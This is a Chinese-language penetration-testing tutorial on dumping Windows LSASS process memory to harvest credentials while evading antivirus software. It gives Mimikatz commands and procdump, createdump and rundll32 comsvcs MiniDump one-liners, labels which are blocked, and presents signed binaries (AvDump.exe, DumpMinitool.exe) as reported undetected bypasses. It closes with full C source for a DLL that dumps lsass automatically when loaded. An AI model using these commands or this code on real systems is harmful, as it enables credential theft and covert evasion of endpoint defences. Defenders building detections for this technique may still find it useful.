## 前言

获取Windows用户的凭证信息是渗透过程中至关重要的一步。

没杀软，只要有权限想怎么读就怎么读。

有杀软，得用一些特别的技巧。

> 注：本机所有测试均为物理机,且为最新版AV

## Mimikatz直接读取Lsass进程

权限提升

    
    
    privilege::debug
    

抓取密码

    
    
    sekurlsa::logonpasswords
    

![image-20220411145456534.png](https://image.3001.net/images/20220418/1650257552_625cee9092b7a26326569.png!small)

但如果此时目标机器上有AV，必定将收到拦截

![image-20220411145304591.png](https://image.3001.net/images/20220418/1650257558_625cee96151548af7f807.png!small)

此时mimikatz必须免杀。

一般来说，目标机器有杀软的存在，更倾向于离线解析密码。

## 白名单文件dump

首先说三个微软签名的白名单程序

  1. Procdump.exe

  2. SQLDumper.exe

  3. createdump.exe

### Procdump.exe(no)

尽管procdump拥有微软签名，但大部分AV厂商对此并不买账。  
![image-20220411151942096.png](https://image.3001.net/images/20220418/1650257653_625ceef520b6730ccf0e9.png!small)

    
    
    procdump.exe  -ma lsass.exe 1.txt
    

![image-20220411151730646.png](https://image.3001.net/images/20220418/1650257660_625ceefc6fbaa7d4ffa64.png!small)

SQLDumper.exe也是一样的

### createdump.exe(no)

> createdump.exe随着.NET5出现的，本身是个native binary
>
> 虽然有签名同样遭到AV查杀

![image-20220411153928918.png](https://image.3001.net/images/20220418/1650257669_625cef05cdae082aa8d96.png!small)

    
    
    createdump.exe -u -f lsass.dmp lsass[PID]
    

![image-20220411153546445.png](https://image.3001.net/images/20220418/1650257674_625cef0aa134ec5c944ca.png!small)

### Rundll32.exe(no)

> 使用rundll32直接执行comsvcs.dll的导出函数`MiniDump`来Dump进程内存
    
    
    rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id Desktop\lsass-comsvcs.dmp full
    

同样被查杀

![image-20220411153928918.png](https://image.3001.net/images/20220418/1650257680_625cef10a130395d3da82.png!small)

### avdump.exe(yes)

`AvDump.exe`是`Avast`杀毒软件中自带的一个程序，可用于转储指定进程（lsass.exe）内存数据，它带有Avast杀软数字签名。

![image-20220411154751497.png](https://image.3001.net/images/20220418/1650257686_625cef16028a242f3f0ad.png!small)

默认路径为：

    
    
    C:\Program Files\Avast Software\Avast
    

![image-20220411154651575.png](https://image.3001.net/images/20220418/1650257699_625cef23c2e97cc014fa6.png!small)

    
    
    AvDump.exe --pid 980 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
    

成功dump并解密，全程数字杀软无感。

![image-20220411155527628.png](https://image.3001.net/images/20220418/1650257715_625cef3329332fac6c50e.png!small)

### DumpMinitool.exe(yes)

此exe为近日`mr.d0x`的某推上分享了的一个LOLBIN，通过vs2022里的`DumpMinitool.exe`来导出`lsass`进程。

![image-20220411160252764.png](https://image.3001.net/images/20220418/1650257722_625cef3aa34699c973ca0.png!small)  
路径为：

    
    
    C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions
    

![image-20220411161251476.png](https://image.3001.net/images/20220418/1650257727_625cef3f42852eff8629e.png!small)

数字杀软全程无感

    
    
    DumpMinitool.exe --file 1.txt --processId 980 --dumpType Full
    

![image-20220411161328099.png](https://image.3001.net/images/20220418/1650257731_625cef4394d255d8fb193.png!small)

## 其他方式

### SilentProcessExit进行Dump(no)

具体原理参考文章：[利用SilentProcessExit机制dump内存](https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w)

> Silent Process Exit，即静默退出。而这种调试技术，可以派生
> werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。

但该方式需要修改注册表，修改注册表操作将会被查杀。

![image-20220411170407188.png](https://image.3001.net/images/20220418/1650257737_625cef495323b0e408b81.png!small)

### 编写Dump Lsass的DLL(yes)

  1. 获取Debug权限

  2. 找到lsass的PID

  3. 使用MiniDump或MiniDumpWriteDump进行内存dump

    
    
    #include <stdio.h>
    #include <Windows.h>
    #include <tlhelp32.h>
    
    typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);
    
    int GetLsassPid() {
    
    	PROCESSENTRY32 entry;
    	entry.dwSize = sizeof(PROCESSENTRY32);
    
    	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    
    	if (Process32First(hSnapshot, &entry)) {
    		while (Process32Next(hSnapshot, &entry)) {
    			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
    				return entry.th32ProcessID;
    			}
    		}
    	}
    
    	CloseHandle(hSnapshot);
    	return 0;
    }
    
    void GetDebugPrivilege()
    {
    	BOOL fOk = FALSE;
    	HANDLE hToken;
    	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    	{
    		TOKEN_PRIVILEGES tp;
    		tp.PrivilegeCount = 1;
    		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
    		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    		fOk = (GetLastError() == ERROR_SUCCESS);
    		CloseHandle(hToken);
    	}
    }
    
    void DumpLsass()
    {
    	wchar_t  ws[100];
    	_MiniDumpW MiniDumpW;
    	
    	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
    	swprintf(ws, 100, L"%u %hs", GetLsassPid(), "c:\\windows\\temp\\temp.bin full");
    
    	GetDebugPrivilege();
    
    	MiniDumpW(0, 0, ws);
    }
    
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
    		DumpLsass();
    		break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    

成功dump，数字杀软无感。

![image-20220411172246371.png](https://image.3001.net/images/20220418/1650257745_625cef517b90438e736ef.png!small)

